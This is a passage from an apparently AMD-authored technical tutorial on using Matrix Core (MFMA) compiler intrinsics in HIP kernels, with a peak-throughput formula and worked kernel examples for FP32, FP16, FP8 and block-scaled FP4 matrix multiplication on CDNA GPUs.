2*M*N*K * num_matrix_cores * (max_engine_clock / cycle_count) / 10^6,
&lt;/code&gt;
    &lt;/p&gt;
    &lt;p&gt;where&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;num_matrix_cores&lt;/code&gt;is total number of matrix cores in a GPU (specified in white paper)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;max_engine_clock&lt;/code&gt;is max engine clock (peak) in MHz (specified in white paper)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;cycle_count&lt;/code&gt;is cycle count of corresponding MFMA instruction&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;M, N, K&lt;/code&gt;are matrix dimensions&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Using this formula and the MFMA instruction &lt;code&gt;32x32x8 FP16&lt;/code&gt; as an example, we can estimate theoretical peak FP16 Matrix Core performance on the AMD Instinct™ MI325X:&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;2*32*32*8 * 1216 * (2100 / 32) / 10^6 = 1307.4 TFLOP/s&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;4. Compiler Intrinsics&lt;/head&gt;
    &lt;p&gt;To use Matrix Core instructions in HIP kernels, LLVM provides built-in compiler intrinsic functions. The list of all available compiler intrinsics can be found in the LLVM Github repository. The syntax of the MFMA intrinsics has the following format:&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;d_reg = __builtin_amdgcn_mfma_ODType_MxNxKInDType(a_reg, b_reg, c_reg, cbsz, abid, blgp)&lt;/code&gt;,&lt;/p&gt;
    &lt;p&gt;where&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;MxNxK&lt;/code&gt;specifies the shapes of the matrices&lt;code&gt;A&lt;/code&gt;,&lt;code&gt;B&lt;/code&gt;,&lt;code&gt;C&lt;/code&gt;,&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ODType&lt;/code&gt;is data type of the matrices&lt;code&gt;C&lt;/code&gt;and&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;InDType&lt;/code&gt;is data type of the input matrices&lt;code&gt;A&lt;/code&gt;and&lt;code&gt;B&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;a_reg&lt;/code&gt;is a scalar/vector containing a portion of the matrix&lt;code&gt;A&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;b_reg&lt;/code&gt;is a scalar/vector containing a portion of the matrix&lt;code&gt;B&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;c_reg&lt;/code&gt;is a vector containing a portion of the matrix&lt;code&gt;C&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;d_reg&lt;/code&gt;is a vector containing a portion of the matrix&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;cbsz&lt;/code&gt;,&lt;code&gt;abid&lt;/code&gt;,&lt;code&gt;blgp&lt;/code&gt;are broadcast flags. For the following discussion, these flags are irrelevant and are, therefore, set to 0 by default, unless specified otherwise. Please refer to the ISA reference guide for detailed information on the broadcast flags.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;For example,&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;__builtin_amdgcn_mfma_f32_16x16x16f16&lt;/code&gt;performs&lt;code&gt;16x16x16&lt;/code&gt;MFMA, where both input matrices&lt;code&gt;A&lt;/code&gt;and&lt;code&gt;B&lt;/code&gt;have type&lt;code&gt;FP16&lt;/code&gt;and the output matrix has type&lt;code&gt;FP32&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;__builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8&lt;/code&gt;performs&lt;code&gt;32x32x16&lt;/code&gt;MFMA, where both input matrices&lt;code&gt;A&lt;/code&gt;and&lt;code&gt;B&lt;/code&gt;have type&lt;code&gt;FP8(E4M3)&lt;/code&gt;and the output matrix is stored in&lt;code&gt;FP32&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;__builtin_amdgcn_mfma_f32_32x32x16_fp8_bf8&lt;/code&gt;performs&lt;code&gt;32x32x16&lt;/code&gt;MFMA, where the matrix&lt;code&gt;A&lt;/code&gt;has type&lt;code&gt;FP8(E4M3)&lt;/code&gt;and the matrix&lt;code&gt;B&lt;/code&gt;has type&lt;code&gt;BF8(E5M2)&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The MFMA instructions are wavefront-level (warp-level) instructions, where all work-items (threads) within a wavefront collectively perform a single MFMA operation and the operands &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;B&lt;/code&gt;, &lt;code&gt;C&lt;/code&gt;, &lt;code&gt;D&lt;/code&gt; are distributed across work-items so that each work-item in the wavefront holds a portion of the operands. In order to use the MFMA instructions, it’s required to understand how the operands are distributed across threads within a wavefront. The ISA reference guide fully specifies the data layout for all available MFMA instructions. For illustrative purposes, the next chapter explains a subset of the MFMA instructions and the corresponding data layouts.&lt;/p&gt;
    &lt;head rend="h2"&gt;5. Examples&lt;/head&gt;
    &lt;quote&gt;&lt;p&gt;Important note: In the following discussion we assume the matrices are stored in row-major order. The wavefront size on the AMD CDNA™ architecture is 64. The shapes of the matrices&lt;/p&gt;&lt;code&gt;A&lt;/code&gt;,&lt;code&gt;B&lt;/code&gt;,&lt;code&gt;C&lt;/code&gt;,&lt;code&gt;D&lt;/code&gt;are&lt;code&gt;MxK&lt;/code&gt;,&lt;code&gt;KxN&lt;/code&gt;,&lt;code&gt;MxN&lt;/code&gt;, and&lt;code&gt;MxN&lt;/code&gt;, respectively. The first dimension denotes the number of rows and the second dimension the number of columns in a matrix. For example, the matrix&lt;code&gt;A&lt;/code&gt;has&lt;code&gt;M&lt;/code&gt;rows and&lt;code&gt;K&lt;/code&gt;columns.&lt;/quote&gt;
    &lt;head rend="h3"&gt;5.1. __builtin_amdgcn_mfma_f32_32x32x2f32&lt;/head&gt;
    &lt;p&gt;In this example we will multiply matrix &lt;code&gt;A&lt;/code&gt; of size &lt;code&gt;32x2&lt;/code&gt; with matrix &lt;code&gt;B&lt;/code&gt; of size &lt;code&gt;2x32&lt;/code&gt; using single wavefront (64 threads) and single MFMA instruction. The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;32x32&lt;/code&gt;. The input and output matrices are FP32. Since threads within a wavefront collectively perform single MFMA instruction, the operands are distributed across the threads. Each thread stores&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;M * K / wavefront_size = 32 * 2 / 64 = 1&lt;/code&gt;entries of the matrix&lt;code&gt;A&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;K * N / wavefront_size = 2 * 32 / 64 = 1&lt;/code&gt;entries of the matrix&lt;code&gt;B&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;M * N / wavefront_size = 32 * 32 / 64 = 16&lt;/code&gt;entries of the matrix&lt;code&gt;C&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The operands are distributed according to the scheme below. The matrix elements highlighted in light red are those stored by the thread with index &lt;code&gt;0&lt;/code&gt; within the wavefront.&lt;/p&gt;
    &lt;p&gt;Figure 5: Data layout for `__builtin_amdgcn_mfma_f32_32x32x2f32`. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The code example below demonstrates how this operation can be implemented as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;

using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x2_fp32(const float* A, const float* B, float* C) {
    float a_reg;
    float b_reg;
    fp32x16_t c_reg {};

    const float* ldg_a_ptr = A + threadIdx.x / 32 + 2 * (threadIdx.x % 32);
    const float* ldg_b_ptr = B + threadIdx.x % 32 + (threadIdx.x / 32) * 32;

    a_reg = *ldg_a_ptr;
    b_reg = *ldg_b_ptr;

    c_reg = __builtin_amdgcn_mfma_f32_32x32x2f32(a_reg, b_reg, c_reg, 0, 0, 0);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;The GPU kernel can then be invoked on the host using a single wavefront:&lt;/p&gt;
    &lt;code&gt;mfma_fp32_32x32x2_fp32&amp;lt;&amp;lt;&amp;lt;1, 64&amp;gt;&amp;gt;&amp;gt;(A_device, B_device, C_device);
&lt;/code&gt;
    &lt;p&gt;Please note that we use the vector data type &lt;code&gt;fp32x16_t&lt;/code&gt; to store the entries of the matrix &lt;code&gt;C&lt;/code&gt; in registers. Additionally, we zero-initialize &lt;code&gt;c&lt;/code&gt;, since we compute &lt;code&gt;C = A * B&lt;/code&gt; without accumulation.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.2. __builtin_amdgcn_mfma_f32_16x16x16f16&lt;/head&gt;
    &lt;p&gt;This example demonstrates how to multiply matrix &lt;code&gt;A&lt;/code&gt; of size &lt;code&gt;16x16&lt;/code&gt; with matrix &lt;code&gt;B&lt;/code&gt; of size &lt;code&gt;16x16&lt;/code&gt; using single wavefront (64 threads) and single MFMA instruction. The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;16x16&lt;/code&gt;. The input matrices are stored in FP16 and the output matrix stored in FP32. In this case, each thread stores &lt;code&gt;4&lt;/code&gt; entries of the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;4&lt;/code&gt; entries of the matrix &lt;code&gt;B&lt;/code&gt; and &lt;code&gt;4&lt;/code&gt; entries of the matrix &lt;code&gt;C&lt;/code&gt;. The data layout for this instruction is shown below. For illustrative purposes, the elements stored by the first thread within the wavefront are highlighted in red.&lt;/p&gt;
    &lt;p&gt;Figure 6: Data layout for __builtin_amdgcn_mfma_f32_16x16x16f16. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;Corresponding HIP kernel is implemented below:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_fp16.h&amp;gt;

using fp16_t = _Float16;
using fp16x4_t = __attribute__((vector_size(4 * sizeof(fp16_t)))) fp16_t;
using fp32x4_t = __attribute__((vector_size(4 * sizeof(float)))) float;

__global__ void
mfma_fp32_16x16x16_fp16(const fp16_t* A, const fp16_t* B, float* C) {

    fp16x4_t a_reg;
    fp16x4_t b_reg;
    fp32x4_t c_reg {};

    a_reg = *reinterpret_cast&amp;lt;const fp16x4_t*&amp;gt;(A + 4 * (threadIdx.x / 16) + 16 * (threadIdx.x % 16));

    for (int i = 0; i &amp;lt; 4; i++) {
        b_reg[i] = *(B + i * 16 + threadIdx.x % 16 + (threadIdx.x / 16) * 64);
    }

    c_reg = __builtin_amdgcn_mfma_f32_16x16x16f16(a_reg, b_reg, c_reg, 0, 0, 0);

    for (int i = 0; i &amp;lt; 4; i++) {
        *(C + i * 16 + threadIdx.x % 16 + (threadIdx.x / 16) * 64) = c_reg[i];
    }
}
&lt;/code&gt;
    &lt;p&gt;Please note that both &lt;code&gt;__half&lt;/code&gt; and &lt;code&gt;_Float16&lt;/code&gt; types can be used in device code. However, the host supports only &lt;code&gt;_Float16&lt;/code&gt; type for arithmetic operations. As in the previous example, we use vector data types to store the matrix elements in registers.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.3. __builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8&lt;/head&gt;
    &lt;p&gt;In this example we will multiply matrix &lt;code&gt;A&lt;/code&gt; of size &lt;code&gt;32x16&lt;/code&gt; with matrix &lt;code&gt;B&lt;/code&gt; of size &lt;code&gt;16x32&lt;/code&gt; using single wavefront (64 threads) and single MFMA instruction. The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;32x32&lt;/code&gt;. The input matrices are stored in FP8 and the output matrix is stored in FP32. In this scenario, each thread stores &lt;code&gt;8&lt;/code&gt; elements of the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;8&lt;/code&gt; elements of the matrix &lt;code&gt;B&lt;/code&gt; and &lt;code&gt;16&lt;/code&gt; elements of the matrix &lt;code&gt;C&lt;/code&gt;. The operands are distributed according to the scheme below. For illustrative purposes, the elements stored by the first thread within the wavefront are highlighted in red.&lt;/p&gt;
    &lt;p&gt;Figure 7: Data layout for __builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The code example below implements this operation as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_fp8.h&amp;gt;

using fp8_t = __hip_fp8_storage_t;
using fp8x8_t = __attribute__((vector_size(8 * sizeof(fp8_t)))) fp8_t;
using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x16_fp8_fp8(const fp8_t* A, const fp8_t* B, float* C) {
    fp8x8_t a_reg;
    fp8x8_t b_reg;
    fp32x16_t c_reg {};

    a_reg = *reinterpret_cast&amp;lt;const fp8x8_t*&amp;gt;(A + (threadIdx.x / 32) * 8 + (threadIdx.x % 32) * 16);

    for (int i = 0; i &amp;lt; 8; i++) {
        b_reg[i] = *(B + i * 32 + threadIdx.x % 32 + (threadIdx.x / 32) * 8 * 32);
    }

    c_reg = __builtin_amdgcn_mfma_f32_32x32x16_fp8_fp8((long)a_reg, (long)b_reg, c_reg, 0, 0, 0);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;To define FP8, we use &lt;code&gt;__hip_fp8_storage_t&lt;/code&gt; type from &lt;code&gt;hip_fp8.h&lt;/code&gt;. Note that the intrinsic function expects its first two operands to be of type &lt;code&gt;long&lt;/code&gt;. To compile the code, the operands &lt;code&gt;a&lt;/code&gt; and &lt;code&gt;b&lt;/code&gt; are, therefore, converted to &lt;code&gt;long&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.4. __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f8&lt;/head&gt;
    &lt;quote&gt;
      &lt;p&gt;Important note: the MFMA instruction discussed in this example is supported only on AMD CDNA™4 GPUs (gfx950). Please make sure to install AMD ROCm™ version 7.0 or later.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The AMD CDNA™4 architecture introduces a new family of MFMA instructions with block exponent scaling. The syntax of these instructions differs from the classic MFMA compiler intrinsics:&lt;/p&gt;
    &lt;p&gt;
      &lt;code&gt;d_reg = __builtin_amdgcn_mfma_scale_f32_MxNxK_f8f6f4(a_reg, b_reg, c_reg, Atype, Btype, OPSEL_A, scale_a, OPSEL_B, scale_b)&lt;/code&gt;
    &lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;&lt;code&gt;MxNxK&lt;/code&gt;specifies shapes of the matrices&lt;code&gt;A&lt;/code&gt;,&lt;code&gt;B&lt;/code&gt;,&lt;code&gt;C&lt;/code&gt;,&lt;code&gt;D&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;a_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;A&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;b_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;B&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;c_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;C&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;d_reg&lt;/code&gt;is a vector containing elements of the matrix&lt;code&gt;D&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;Atype&lt;/code&gt;is an integer that specifies the data type of the matrix&lt;code&gt;A&lt;/code&gt;. The following values are possible:&lt;code&gt;0 = E4M3 (fp8), 1 = E5M2(bf8), 2 = E2M3(fp6), 3 = E3M2(bf6), 4 = E2M1(fp4)&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;Btype&lt;/code&gt;is an integer that specifies the data type of the matrix&lt;code&gt;B&lt;/code&gt;. The following values are possible:&lt;code&gt;0 = E4M3 (fp8), 1 = E5M2(bf8), 2 = E2M3(fp6), 3 = E3M2(bf6), 4 = E2M1(fp4)&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;OPSEL_A&lt;/code&gt;,&lt;code&gt;OPSEL_B&lt;/code&gt;are OPSEL codes. These arguments are not relevant for the discussion and therefore will be set to&lt;code&gt;0&lt;/code&gt;,&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;scale_a&lt;/code&gt;,&lt;code&gt;scale_b&lt;/code&gt;are scalars / vectors containing scale factors of type&lt;code&gt;E8M0&lt;/code&gt;.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;As an example, let’s take a closer look at the instruction &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt;. The inputs to this instruction are&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Matrix &lt;code&gt;A&lt;/code&gt;of size&lt;code&gt;32x64&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Matrix &lt;code&gt;Ax&lt;/code&gt;of size&lt;code&gt;32x2&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Matrix &lt;code&gt;B&lt;/code&gt;of size&lt;code&gt;64x32&lt;/code&gt;&lt;/item&gt;
      &lt;item&gt;Matrix &lt;code&gt;Bx&lt;/code&gt;of size&lt;code&gt;2x32&lt;/code&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The output matrix &lt;code&gt;C&lt;/code&gt; has shape &lt;code&gt;32x32&lt;/code&gt;. Specifically, this instruction performs the following operation using single wavefront (64 threads):&lt;/p&gt;
    &lt;p&gt;Figure 8: Block-scaled matrix multiplication via __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4.&lt;/p&gt;
    &lt;p&gt;During dot product operations, the scales &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;Bx&lt;/code&gt; are applied after the normal dot product and prior to output/accumulation.&lt;/p&gt;
    &lt;p&gt;In this example, we will multiply two FP8 matrices using the &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt; intrinsic function. The input matrices &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;B&lt;/code&gt; are stored in FP8 format, while the output matrix is stored in FP32. The scale matrices &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;Bx&lt;/code&gt; contain elements of type &lt;code&gt;E8M0&lt;/code&gt;. Each thread stores &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;B&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Bx&lt;/code&gt; and &lt;code&gt;16&lt;/code&gt; entries from the matrix &lt;code&gt;C&lt;/code&gt;. The operands are distributed according to the scheme below. Please note that this scheme is valid only if both input matrices &lt;code&gt;A&lt;/code&gt; and &lt;code&gt;B&lt;/code&gt; have FP8 type. For illustrative purposes, the matrix elements stored by the thread with &lt;code&gt;threadIdx.x = 0&lt;/code&gt; are highlighted in light red, while the elements stored by the thread with &lt;code&gt;threadIdx.x = 32&lt;/code&gt; within the wavefront are highlighted in light green.&lt;/p&gt;
    &lt;p&gt;Figure 9: Data layout for __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4 with FP8 input matrices. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The following code example shows how this operation can be implemented as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_ext_ocp.h&amp;gt;

using fp8_t = __amd_fp8_storage_t;
using fp8x32_t = __attribute__((vector_size(32 * sizeof(fp8_t)))) fp8_t;
using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x64_fp8_fp8(const fp8_t* A, const fp8_t* B, float* C) {
    fp8x32_t a_reg;
    fp8x32_t b_reg;
    fp32x16_t c_reg {};

    const fp8_t* ldg_a = A + (threadIdx.x % 32) * 64 + (threadIdx.x / 32) * 16;
    for (int i=0; i &amp;lt; 2; i++) {
        for (int j=0; j &amp;lt; 16; j++) {
            a_reg[i*16 + j] = *(ldg_a + i * 32 + j);
        }
    }

    const fp8_t* ldg_b = B + threadIdx.x % 32 + 32 * 16 * (threadIdx.x / 32);

    for (int i=0; i&amp;lt;2; i++) {
        for (int j=0; j &amp;lt; 16; j++) {
            b_reg[i*16 + j] = *(ldg_b + 32 * j + i * 32 * 32);
        }
    }

    uint8_t scale_a = 127;
    uint8_t scale_b = 127;

    c_reg = __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4(a_reg, b_reg, c_reg, 0, 0, 0, scale_a, 0, scale_b);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;Please note that in this example we use &lt;code&gt;__amd_fp8_storage_t&lt;/code&gt; type defined in &lt;code&gt;hip_ext_ocp.h&lt;/code&gt; to represent FP8. This library provides extensions APIs for low-precision and micro-scaling formats, and compared to &lt;code&gt;hip_fp8.h&lt;/code&gt;, exposes a wider capability set. &lt;code&gt;gfx950&lt;/code&gt; provides hardware acceleration for these APIs. Most of the APIs are 1 to 1 mapping of hardware instruction. Additionally, we use &lt;code&gt;uint8_t&lt;/code&gt; type to represent &lt;code&gt;E8M0&lt;/code&gt; scale factors. Since &lt;code&gt;scale_a&lt;/code&gt; and &lt;code&gt;scale_b&lt;/code&gt; encode exponent values, the corresponding actual scale factors are &lt;code&gt;2^(scale_a - 127)&lt;/code&gt; and &lt;code&gt;2^(scale_b - 127)&lt;/code&gt;. If &lt;code&gt;scale_a = scale_b = 127&lt;/code&gt;, the actual scale factors are equal to &lt;code&gt;1&lt;/code&gt; and no scaling is applied.&lt;/p&gt;
    &lt;head rend="h3"&gt;5.5. __builtin_amdgcn_mfma_scale_f32_32x32x64_f4f4&lt;/head&gt;
    &lt;p&gt;In our last example, we demonstrate how to multiply two FP4 matrices using the &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt; intrinsic function. As in the previous example, each thread stores &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;A&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Ax&lt;/code&gt;, &lt;code&gt;32&lt;/code&gt; entries from the matrix &lt;code&gt;B&lt;/code&gt;, &lt;code&gt;1&lt;/code&gt; entry from the matrix &lt;code&gt;Bx&lt;/code&gt; and &lt;code&gt;16&lt;/code&gt; entries from the matrix &lt;code&gt;C&lt;/code&gt;. The data layout for the output matrix remains the same as in the FP8 case. However, the data layout for the input matrices is different and depicted below. For illustrative purposes, the matrix elements stored by the thread with &lt;code&gt;threadIdx.x = 0&lt;/code&gt; are highlighted in light red, while the elements stored by the thread with &lt;code&gt;threadIdx.x = 32&lt;/code&gt; within the wavefront are highlighted in light green.&lt;/p&gt;
    &lt;p&gt;Figure 10: Data layout for __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4 with FP4 input matrices. The operands are stored in row-major order.&lt;/p&gt;
    &lt;p&gt;The code snippet below demonstrates how to implement this operation as a HIP kernel:&lt;/p&gt;
    &lt;code&gt;#include &amp;lt;hip/hip_runtime.h&amp;gt;
#include &amp;lt;hip/hip_ext_ocp.h&amp;gt;

using fp4x2_t = __amd_fp4x2_storage_t;
using fp4x64_t  = fp4x2_t __attribute__((ext_vector_type(32)));
using fp32x16_t = __attribute__((vector_size(16 * sizeof(float)))) float;

__global__ void
mfma_fp32_32x32x64_fp4_fp4(const fp4x2_t* A, const fp4x2_t* B, float* C) {

    fp4x64_t a_reg {};
    fp4x64_t b_reg {};
    fp32x16_t c_reg {};

    const fp4x2_t* ldg_a = A + (threadIdx.x % 32) * 32 + (threadIdx.x / 32) * 16;

    for (int i = 0; i &amp;lt; 16; i++) {
        a_reg[i] = *(ldg_a + i);
    }

    const fp4x2_t* ldg_b = B + (threadIdx.x % 32) / 2 + 16 * 32 * (threadIdx.x / 32);
    int b_extract_idx = threadIdx.x % 2;

    for (int i = 0; i &amp;lt; 16; i++) {
        uint8_t tmp0 = __amd_extract_fp4(*(ldg_b + 16 * 2 * i), b_extract_idx);
        uint8_t tmp1 = __amd_extract_fp4(*(ldg_b + 16 * (2 * i + 1)), b_extract_idx);
        b_reg[i] = __amd_create_fp4x2(tmp0, tmp1);
    }

    uint8_t scale_a = 127;
    uint8_t scale_b = 127;

    c_reg = __builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4(a_reg, b_reg, c_reg, 4, 4, 0, scale_a, 0, scale_b);

    for (int i = 0; i &amp;lt; 4; i++) {
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + i * 32 * 8]          = c_reg[i * 4];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 1 + i * 32 * 8] = c_reg[i * 4 + 1];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 2 + i * 32 * 8] = c_reg[i * 4 + 2];
        C[threadIdx.x % 32 + (threadIdx.x / 32) * 4 * 32 + 32 * 3 + i * 32 * 8] = c_reg[i * 4 + 3];
    }
}
&lt;/code&gt;
    &lt;p&gt;Since memory addressing is not allowed at a granularity smaller than 8 bits, we use &lt;code&gt;__amd_fp4x2_storage_t&lt;/code&gt; (an alias for &lt;code&gt;uint8_t&lt;/code&gt;) to store the input matrices and enable pointer operations. Note that the FP4 elements that need to be loaded from the matrix &lt;code&gt;B&lt;/code&gt; are not contiguous in memory. To extract a single FP4 element, we use the &lt;code&gt;__amd_extract_fp4&lt;/code&gt; function provided in &lt;code&gt;hip_ext_ocp.h&lt;/code&gt;. This function returns one FP4 element (of type &lt;code&gt;uint8_t&lt;/code&gt;) from a fp4x2 vector, based on the index passed as the second argument:&lt;/p&gt;
    &lt;code&gt;uint8_t __amd_extract_fp4(const __amd_fp4x2_storage_t x, const size_t index) {
    if (index == 0) return (x &amp;amp; 0xFu);
    return (x &amp;gt;&amp;gt; 4);
}
&lt;/code&gt;
    &lt;p&gt;Two FP4 values are then combined into &lt;code&gt;__amd_fp4x2_storage_t&lt;/code&gt; using &lt;code&gt;__amd_create_fp4x2&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;__amd_fp4x2_storage_t __amd_create_fp4x2(const uint8_t x, const uint8_t y) {
    __amd_fp4x2_storage_t ret = 0;
    ret = x | (y &amp;lt;&amp;lt; 4);
    return ret;
}
&lt;/code&gt;
    &lt;p&gt;The compiler intrinsic function &lt;code&gt;__builtin_amdgcn_mfma_scale_f32_32x32x64_f8f6f4&lt;/code&gt; requires its first two arguments to be 256 bits wide. Since 32 FP4 elements occupy only 128 bits, we define &lt;code&gt;fp4x64_t&lt;/code&gt;, which is 256 bits wide. In this type, 128 bits contain data, while the remaining 128 bits are zero. This allows us to pass &lt;code&gt;a_reg&lt;/code&gt; and &lt;code&gt;b_reg&lt;/code&gt; to the intrinsic function and compile the code successfully.&lt;/p&gt;
    &lt;head rend="h2"&gt;Summary&lt;/head&gt;
